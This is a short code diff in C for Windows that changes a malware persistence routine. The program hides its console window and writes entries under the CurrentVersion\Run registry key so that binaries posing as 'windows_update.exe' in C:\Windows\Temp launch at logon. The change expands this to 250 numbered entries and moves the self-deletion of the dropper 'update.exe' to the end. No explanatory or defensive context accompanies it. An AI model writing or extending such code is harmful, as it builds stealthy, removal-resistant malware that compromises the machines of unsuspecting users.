@@ -19,10 +19,15 @@ int persistence(const char *reg_key, const char *value){
         printf("RegCloseKey failed: %u\n", GetLastError());
         return -1;
     }
-    WinExec("del update.exe", 0);
     return 0;
 }
 int main(){
     FreeConsole();
-    persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run","C:\\Windows\\Temp\\windows_update.exe");
+    for(int i = 1; i <= 250; i++){
+        char buf[250];
+        snprintf(buf, sizeof(buf), "C:\\Windows\\Temp\\windows_update_%d.exe", i);
+        persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf);
+    }
+    WinExec("del update.exe", 0);
+
 }
